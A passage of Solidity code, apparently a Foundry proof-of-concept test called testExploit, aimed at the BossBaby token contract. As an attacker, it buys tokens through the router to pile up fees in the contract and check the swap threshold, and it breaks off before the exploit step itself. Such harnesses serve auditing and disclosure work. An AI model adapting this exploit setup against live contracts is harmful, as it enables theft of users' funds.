    function testExploit() public {
        // Record initial BNB balance
        uint256 initialBalance = address(attacker).balance;

        // Verify preconditions
        require(BossBaby(TARGET).tradingEnabled(), "Trading must be enabled");
        require(BossBaby(TARGET).swapEnabled(), "Swap must be enabled");

        // Get router and WETH address
        IUniswapV2Router02 router = IUniswapV2Router02(BossBaby(TARGET).uniswapV2Router());
        address weth = router.WETH();

        // Buy tokens to accumulate fees in contract
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = TARGET;

        // First buy to get some tokens
        vm.prank(attacker);
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 5 ether}(
            0,
            path,
            attacker,
            block.timestamp
        );

        // Check contract token balance to ensure it's above swapTokensAtAmount
        uint256 contractBalance = BossBaby(TARGET).balanceOf(TARGET);
        uint256 swapThreshold = BossBaby(TARGET).swapTokensAtAmount();

        // If contract balance is below threshold, we need to accumulate more fees
        // by making more transactions
        if (contractBalance < swapThreshold) {
